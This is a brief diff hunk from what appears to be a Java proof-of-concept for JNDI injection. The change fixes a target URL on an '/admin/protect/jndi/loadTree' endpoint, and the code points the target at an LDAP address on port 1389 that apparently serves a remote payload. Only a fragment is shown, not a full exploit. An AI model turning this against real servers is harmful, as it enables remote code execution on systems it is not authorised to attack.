@@ -15,7 +15,7 @@ public class loadTree_jndi {
 
     public static void main(String[] args) throws IOException {
 
-        String url = "http://10.58.120.201:6888/admin//protect/jndi/loadTree";
+        String url = "http://10.58.120.201:6888/admin/protect/jndi/loadTree";
         String jndiUrl = "ldap://10.58.120.200:1389/qczdev";
 
         HttpRequest httpRequest = new HttpRequest("127.0.0.1",8080);
